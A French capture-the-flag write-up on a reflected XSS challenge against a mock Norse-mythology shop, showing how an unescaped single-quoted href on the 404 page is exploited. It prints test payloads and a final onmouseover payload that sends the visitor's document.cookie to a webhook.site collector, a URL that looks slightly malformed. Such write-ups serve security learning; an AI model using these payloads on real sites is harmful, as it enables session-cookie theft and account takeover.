
Résolution du challenge XSS Volatile / XSS Reflected

## Définition

Avant toute chose, il est important de savoir que les vulnérabilités de type XSS Volatile, représentent à elles seules la majorité des failles XSS rencontrées (estimées à 75% environs).  
Ces injections se font via des requêtes GET ou POST dans la plupart des cas via un lien ou une URL malicieuse qui sera ensuite envoyée à la victime.

## Rappel du contexte

Dans l’objectif de la réalisation d’exploitation d’une vulnérabilité de type XSS Volatile, un site internet vulnérable nous est présenté.  
Ce site met en vente des produits en relation avec les dieux de la mythologie Nordique.  
Nous devrons être en capacité de pouvoir trouver et exploiter une vulnérabilité de type XSS Volatile à travers ce site.

## Prise d’information

La prise d’information, plus communément appelé phase de reconnaissance, va nous servir à découvrir l’environnement de manière générale.  
La page d’accueil, nous présente des images mettant en effigie les dieux de la mythologie Nordique.  
Une seconde page nous est accessible et correspond à la page "Prices" où les prix des produits mis en ventes sont dûment présentés.  
Une troisième page "About" nous est aussi accessible, cette dernière correspond à une page de présentation, sans grand intérêt.  
Et enfin la dernière qui nous est accessible, correspond à la partie contact formulaire.

## Début de la phase de reconnaissance

Dans un premier temps, comme j’ai pu le dire plus haut, c’est de trouver le point d’entré, donc trouver l’exploitation de la vulnérabilité XSS Volatile.  
Je vous avoue que j’ai mis énormément de temps à trouver le point d’injection .. Au début ce n’étais pas évident du tout.  
J’ai commencé à regarder du côté du formulaire de contact, mais voyant que l’administrateur ne consulte pas les e-mails j’ai du passé à autre chose, afin de pouvoir trouver comment injecter mon code et faire en sorte que l’administrateur puisse l’exécuter.  
J’ai ensuite testé tout bêtement : `<script>alert(1)</script>` dans les URL.  
Ce qui a commencé par me donner une bonne piste. En effet, le fait de réaliser une requête au niveau de l’URL est gérée de tel façon que, si le chemin n’existe pas, une erreur est affichée, et nous avons la possibilité de pouvoir envoyer l’erreur à l’administrateur (gestion des erreurs par remontée de l’utilisateur).  
A partir de là, nous pouvons estimer que cet envoi sera sûrement le point d’entrée étant donné que contrairement au formulaire contact où l’administrateur nous fait clairement savoir que nos messages ne seront pas lu, là, dans le cas où nous remontons une information relative à une erreur, l’administrateur en prendra sûrement connaissance.

## Phase d’exploitation

Je suis passé par une phase où je devais effectuer mon injection sur les images de la page d’acceuil.  
J’ai tenté d’utiliser des injections de type `<svg onload=alert(1)>`, malheureusement ce dernier ne fonctionnait pas.  
J’ai aussi essayé d’utiliser la fonction `onmouseover` mais toujours rien.  
Au final, mes recherches se sont orientées vers la page de l’envoi d’erreur à l’administrateur, après analyse du code source de la page d’erreur plusieurs pistes se sont offertes à moi.  
Le premier élément est un lien caché vers la page "Security".  
Le deuxième élément étant la construction de la requête pour l’envoi de l’erreur à l’administrateur qui se défini de la manière suivante :  
`"?p=report&url=`  
A savoir que le paramètre `?p=` sert d’include pour réaliser les requêtes sur le serveur web.  
En regardant de plus près, il s’avère que le traitement des pages n’est pas exécuté correctement :  
`<p>The page <a href='?p=testt'>testt</a> could not be found.</p>`  
Nous pouvons voir que le `href=' ...'` n’est pas construit correctement. En effet, la vulnérabilité se trouve à cet endroit-là.  
L’insertion de code javascript est possible à partir de ce `href=' '`  
Se référant aux bonnes pratiques et notamment aux préconisations de l’OWASP :

> ’ —> ' ' not recommended because its not in the HTML spec

surtout parce que contrairement aux doubles quote, l’apostrophe seule, n’est pas filtrée.  
Quote non filtrées  
`<p>The page <a href='?p=aboutezdde'>aboutezdde</a> could not be found.</p>`  
Double Quote filtrées  
`<a href='?p=&quot;aboutezdde&quot;'>&quot;aboutezdde&quot;</a>`  
Nous remarquerons aussi que les chevrons sont encodés en hexa lorsqu’ils sont passés directement dans l’URL.  
`/?p=aboutezdde%3C%3E`  
Dans tous les cas, le point sur lequel nous devons jouer est le fameux `href=' '`  
J’ai donc dû trouver un moyen de pouvoir bypasser cet encodage en hexa afin de pouvoir exploiter cette vulnérabilité xss.  
L’un des moyens que j’ai pu trouver après de nombreuses tentatives est le `'onmouseover='alert()`  
En effet, passer le `'onmouseover='alert()` dans l’URL, au survol de la souris sur le message, l’alerte javascript se déclenche correctement.  
L’un de mes premiers tests était sous la forme suivante :  
`?p=’onmouseover=’document.location.href=https://webhook.site/Votre_ID?cookie document.cookie’’>`  
Malheureusement cette requête ne fonctionnait pas…  
Après avoir reçu un peu d’aide sur le channel IRC on m’a orienté vers d’autre appels javascript, notamment la concaténation qui me servira à forger ma requête.  
Finalement ma requête finale ressemble à ça :  
`?p=test' onmouseover='document.location="http://https://webhook.site/Votre_ID?c=" .concat(document.cookie)`'

## Sources :

[https://www.w3schools.com/jsref/event_onmouseover.asp](https://www.w3schools.com/jsref/event_onmouseover.asp)  
[https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)  
[https://www.w3schools.com/jsref/jsref_concat_string.asp](https://www.w3schools.com/jsref/jsref_concat_string.asp)  
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)